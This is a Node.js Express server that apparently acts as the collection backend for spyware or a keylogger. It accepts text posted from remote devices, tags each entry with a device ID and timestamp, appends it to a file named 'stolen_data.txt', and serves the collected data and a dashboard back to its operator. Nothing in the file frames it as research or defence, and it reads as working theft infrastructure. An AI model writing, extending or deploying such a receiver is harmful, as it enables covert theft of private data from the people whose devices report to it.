const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs'); // Import the 'fs' (file system) module
const path = require('path');

const app = express();
const port = 10000;

// The name of the file where we will store the data
const DATA_FILE = 'stolen_data.txt';

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Serve the static HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

// POST endpoint to receive data
app.post('/receive_data', (req, res) => {
    const receivedData = req.body;
    const text = receivedData.data;
    const deviceId = receivedData.deviceId || 'Unknown-Device'; // THIS IS THE KEY CHANGE

    if (text) {
        const timestamp = new Date().toISOString();
        
        // Use the new device ID in the log entry
        const logEntry = `[${timestamp}] [${deviceId}] ${text}\n`;
        
        fs.appendFile(DATA_FILE, logEntry, (err) => {
            if (err) {
                console.error("Error saving to file:", err);
            } else {
                console.log("--- DATA SAVED TO FILE ---");
                console.log(logEntry.trim());
                console.log("-------------------------");
            }
        });
    } else {
        console.log("--- EMPTY DATA RECEIVED ---");
    }

    res.status(200).send('Data received');
});

// --- ADD THIS NEW ROUTE ---
// GET endpoint to fetch the stored data as plain text
app.get('/get_data', (req, res) => {
    const filePath = path.join(__dirname, DATA_FILE);
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            res.status(500).send('Error reading data file.');
        } else {
            res.type('text/plain').send(data);
        }
    });
});
// --- END OF NEW ROUTE ---

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
    console.log(`Data is being saved to ${DATA_FILE}`);
});
